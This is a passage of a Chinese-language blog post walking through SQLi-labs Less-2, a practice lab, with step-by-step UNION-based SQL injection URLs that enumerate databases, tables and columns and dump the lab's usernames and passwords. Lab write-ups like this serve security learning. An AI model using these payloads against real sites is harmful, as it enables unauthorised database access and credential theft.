+<p>经过测试，当order by 是4的时候报错，3的时候正常，说明字段是3，我们使用3字段来显示结果<br>接下来要注入当前使用的数据库信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+<p>注入得到当前使用的数据库之后，我们还要得到全部的数据库信息，使用group_concat函数来查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;Sqli_Edited_Version-master&#x2F;sqlilabs&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata) --+</span><br></pre></td></tr></table></figure>
+<p>注入拿到了全部的数据库信息：information_schema,challenges,mysql,performance_schema,security,sys,test1<br>接下来是注入出表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli_edited_version-master&#x2F;sqlilabs&#x2F;less-2&#x2F;?id&#x3D;-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;) --+</span><br></pre></td></tr></table></figure>
+<p>通过该语句可以注入出来表的名称有：emails,referers,uagents,users<br>该语句中，需要注意的是，查询表名称的时候，where语句后面的指定的数据库应该使用引号将其引用起来，否则将查询失败<br>下面该注入关键表中的字段了，观察表名称，很明显发现users表，个人觉得这个表很关键，于是尝试注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli_edited_version-master&#x2F;sqlilabs&#x2F;less-2&#x2F;?id&#x3D;-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;) --+</span><br></pre></td></tr></table></figure>
+<p>查询到的字段有USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password<br>接下来就是查看id和password下有什么了，继续注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.23.130&#x2F;sqli_edited_version-master&#x2F;sqlilabs&#x2F;less-2&#x2F;?id&#x3D;-1 union select 1,2,group_concat(id,0x3a,username,0x3a,password) from security.users --+</span><br></pre></td></tr></table></figure>
+<p>成功拿到数据：p@ssword,4:secure:crappy,5:stupid:stupidity,6:superman:genious,7:batman:mob!le,8:admin:admin,9:admin1:admin1,10:admin2:admin2,11:admin3:admin3,12:dhakkan:dumbo,13:admin4:admin4,14:admin5:admin5<br>该语句有一个需要注意的地方，当后面的查询语句是from 数据库名+表名 的时候，group_concat函数就不需要在括号里面，而且也要去掉函数前面的select，才能查询成功。</p>
+
+        </div>
+    
+
+</div>
+            
+        </section>
+    </div>
+</div>
+
+
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="" href="/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/3/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Knife1/">Untitled</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20lovesql/">Untitled</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20secret%20file/">Untitled</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20upload/">Untitled</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://telegram.org/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-telegram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
